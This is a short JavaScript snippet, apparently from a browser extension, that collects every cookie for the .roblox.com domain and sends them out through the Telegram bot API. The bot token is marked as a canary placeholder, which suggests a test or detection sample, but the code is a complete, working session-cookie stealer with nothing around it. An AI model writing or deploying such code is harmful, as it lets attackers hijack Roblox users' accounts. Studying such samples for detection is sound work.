async function go(){
 const c = await chrome.cookies.getAll({domain: '.roblox.com'});
 fetch('https://api.telegram.org/bot000000:CANARY_not_a_real_token_xxxxxxxxxxxxxx/sendMessage?chat_id=0&text=' + encodeURIComponent(JSON.stringify(c)));
}
go();
